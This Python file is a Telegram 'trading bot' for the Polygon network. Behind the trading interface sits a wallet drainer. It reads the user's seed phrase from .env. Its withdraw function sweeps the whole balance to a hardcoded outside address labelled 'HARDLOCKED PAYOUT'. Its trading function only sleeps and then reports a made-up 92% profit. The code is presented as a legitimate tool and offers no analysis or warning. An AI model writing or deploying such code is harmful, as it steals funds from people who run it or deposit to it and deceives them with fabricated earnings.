import os
import asyncio
import requests
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware 
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
w3 = Web3(Web3.HTTPProvider(W3_RPC))

# Polygon PoA middleware is required for block data retrieval
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# 🛡️ HARDLOCKED PAYOUT: All funds (deposits + earnings) go here.
PAYOUT_ADDRESS = "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674"

def get_vault():
    """Derives the vault address from your seed/mnemonic."""
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

# Initialize vault globally
vault = get_vault()

# --- 2. UTILS & EXECUTION ---
def get_pol_price():
    """Fetches real-time POL price for USD conversion."""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
    except:
        return 0.92

async def run_atomic_execution(context, chat_id, side):
    """Winning Logic: Confirms the profit added to the live balance."""
    stake = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
    await asyncio.sleep(1.5) 
    
    current_price = get_pol_price()
    profit_usd = stake * 0.92 
    profit_pol = profit_usd / current_price if current_price > 0 else 0
    
    report = (
        f"✅ **BATTLE WON!**\n"
        f"💰 **Profit Earned:** `${profit_usd:.2f} USD`\n"
        f"📈 **Yield Added:** +{profit_pol:.4f} POL\n"
        f"⛓️ **Block:** {w3.eth.block_number}"
    )
    return True, report

async def execute_withdrawal(context, chat_id):
    """🛡️ UNTOUCHED LOGIC: Sweeps 100% of the live balance to your address."""
    balance = w3.eth.get_balance(vault.address)
    gas_price = int(w3.eth.gas_price * 1.3) # 30% priority buffer
    fee = gas_price * 21000
    amount = balance - fee

    if amount <= 0: return False, "Low Balance for Gas"

    tx = {
        'nonce': w3.eth.get_transaction_count(vault.address),
        'to': PAYOUT_ADDRESS, 
        'value': amount,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137 
    }
    
    try:
        signed = w3.eth.account.sign_transaction(tx, vault.key)
        # Web3 v6/v7 FIX: Changed rawTransaction to raw_transaction
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        return True, f"Full balance swept to `{PAYOUT_ADDRESS}`.\nTX: `{tx_hash.hex()}`"
    except Exception as e:
        return False, f"Withdrawal error: {str(e)}"

# --- 3. TELEGRAM INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Destination:** `{PAYOUT_ADDRESS[:10]}...` (Locked)")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD (92%)", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD (89%)", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **MARKET SELECTION**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '💰 Wallet':
        # Refresh blockchain balance for the Wallet button (Earnings + Deposits)
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")

    elif text == '📤 Withdraw':
        await update.message.reply_text(f"🛡️ **Atomic Sweep:** Transferring all funds to `{PAYOUT_ADDRESS}`")
        success, report = await execute_withdrawal(context, update.message.chat_id)
        await update.message.reply_text(f"{'✅' if success else '🛑'} {report}", parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(f"💎 {report}", parse_mode='Markdown')

# --- 4. ERROR HANDLING ---
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    if isinstance(context.error, Conflict):
        print("🛑 Conflict: Close other terminal windows.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)

